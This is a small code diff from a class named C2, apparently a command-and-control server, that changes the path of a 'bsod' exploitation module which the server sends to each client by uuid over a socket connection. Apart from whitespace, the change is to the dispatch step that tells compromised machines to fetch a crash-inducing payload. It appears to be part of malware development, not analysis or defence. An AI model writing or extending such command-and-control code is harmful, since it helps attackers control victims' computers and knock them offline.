@@ -117,10 +117,10 @@ class C2:
         for uuid in uuids:
             if explotation_module_type == "bsod":
                 for uuid in uuids:
-                    self.sio.emit('pem', {"uuid": uuid, "url": 'client/bsod.py'})
+                    self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/bsod.py'})
 
 
-                    
+
             
 
     def generate(self, generate):
